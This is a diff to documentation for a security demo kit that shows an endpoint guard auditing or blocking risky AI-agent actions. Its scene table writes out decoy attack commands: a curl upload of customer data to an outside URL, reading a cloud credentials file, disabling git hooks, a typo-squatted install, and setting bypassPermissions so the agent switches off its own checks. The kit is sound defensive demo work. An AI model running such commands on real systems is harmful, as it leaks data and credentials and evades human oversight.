@@ -22,6 +22,25 @@ The policy's rules (`eai_policy_template.json`):
 - **Download piped into a shell**: `curl … | sh`, `iwr … | iex` and the like.
 - **Force-push**: `git push --force` (or `-f`, `--force-with-lease`).
 - **MCP server added by an agent**: an `mcpServers` config or `mcp add`.
+- **Customer data archived**, **upload to an outside URL** (data exfiltration).
+- **Cloud credentials file read**, **shell startup file edited**, **git hooks switched off** (credentials & config).
+- **Typo-squatted package**, **unknown package registry** (supply chain).
+- **Agent switches off its own checks**, **reaching outside the project** (agent misuse).
+
+### Per-rule actions and presets
+
+Each rule can be set to **Audit** (record it and let it run), **Block**, or **Allow** (the rule is off for the demo):
+on the Endpoint AI tab under **Per-rule actions**, or `./aiguard-kit eai rule <rule-id> allow|audit|block`
+(`./aiguard-kit eai rule` lists them). Presets set them all at once (`./aiguard-kit eai mode <preset>`):
+
+| Preset | Blocks | Audits |
+| --- | --- | --- |
+| `monitor` | nothing | everything |
+| `secrets` | secrets & data, credentials & config, data exfiltration | the rest |
+| `destructive` | destructive actions, supply chain, agent misuse | the rest |
+| `block` | everything | nothing |
+
+Choosing a preset replaces any per-rule choices. Only the kit's own rules can be changed.
 - **Shell lock** (optional, off by default): every shell command from an AI agent.
 
 **Monitor** sets every rule to `audit` (the command runs and is recorded); **Block** sets them to `block`. Before
@@ -86,7 +105,17 @@ happened: **ran** (Endpoint AI records it in Monitor), **blocked** before it ran
 judgement (the model's safety, not Endpoint AI), or stopped by a Claude Code permission prompt (a kit bug to report).
 Endpoint AI's events are the record of what it saw.
 
-The kit resets its work folder before every scene, so each run starts from the same decoys. Policies set up
+| Agent bundles customer data into an archive | `zip -q customers.zip decoy-project/customers.csv` | invented names and test card numbers; the zip stays in the work folder |
+| Agent uploads a file to an outside URL | `echo 'curl -X POST --data-binary @decoy-project/customers.csv https://example.com/upload'` | printed only: nothing is sent |
+| Agent reads a cloud credentials file | `cat ./decoy-project/.aws/credentials` | a decoy with AWS's published example keys |
+| Agent edits a shell startup file | Write tool: `decoy-project/.bashrc` | a decoy inside the throwaway folder, not your real profile; removed after the scene |
+| Agent switches off git hooks | `git -C decoy-repo config core.hooksPath .no-hooks` | only the throwaway repo's config (skipped without git) |
+| Agent installs a typo-squatted package | `echo 'pip install reqeusts'` | printed only: nothing is installed |
+| Agent installs from an unknown registry | `echo 'npm install left-pad --registry https://registry.example.com'` | printed only: nothing is installed |
+| Agent turns off its own permission checks | Write tool: `.claude/settings.json` with `bypassPermissions` | in the work folder only, deleted straight after the scene |
+| Agent reads another project's files | `cat ../eai-other-project/notes.txt` | a second decoy folder the kit creates next to the work folder |
+
+The console groups the scenes (tick a group to tick all of its scenes). The kit resets its work folder before every scene, so each run starts from the same decoys. Policies set up
 before 1.8.28 have only the first two rules: click **Create or update** once to add the rest.
 
 Claude Code may run only each scene's exact command (`--allowedTools` names the full command, nothing broader),
@@ -101,12 +130,15 @@ before it runs and tells the agent why.
 ## Showing the results
 
 - **Live feed** (its own tab in the console, on your laptop; no Client Connector needed there): refreshes every 20
-  seconds while you're looking at it, with new rows flashing. It merges the generator's Endpoint AI events (verdict,
-  tool, command, OWASP Agentic and MITRE ATLAS tags) with the AI Guard events this computer sent, on one clock. ZIA
-  has no near-live log API, so ZIA shows as the Insights summary (about 2 days behind). Pause, sources and window
-  (15 minutes, hour, 24 hours) are on the feed. `./aiguard-kit eai events --hours 24` prints the Endpoint AI part.
-- **Guided demo storyline "AI agents on the endpoint"**: four steps with a talk track. Each step switches the
-  Endpoint AI policy for you (Monitor, Monitor, Block, then back to Monitor) and shows the live feed beside it.
+  seconds while you're looking at it, new rows flashing. Summary tiles across the top count events, blocked,
+  audited, demo events and agent sessions, with the top risk patterns and OWASP Agentic / MITRE ATLAS codes. Each
+  row shows the rule that fired; click it for the reason, the message the agent got, host, user, working folder,
+  serial, session and the raw event. **Sessions** groups events by Claude session with the prompt that started it.
+  **Demo events only** hides everything else. AI Guard events this computer sent are merged in on the same clock;
+  ZIA shows the Insights summary (about 2 days behind, as ZIA has no near-live log API).
+- **Guided demo storyline "AI agents on the endpoint"**: five steps with a talk track. Each step switches the
+  Endpoint AI policy for you, one risk at a time: Monitor, Monitor, Block secrets & data theft, Block everything,
+  then back to Monitor. The live feed sits beside each step.
   You run the scenes on the generator; the laptop only watches.
 - **Build PDF**: the **AI Security Executive Brief** or **AI Asset Report** for the last 7 days
   (`./aiguard-kit eai report --edition executive`), saved under the kit's folder in `reports/` and downloadable
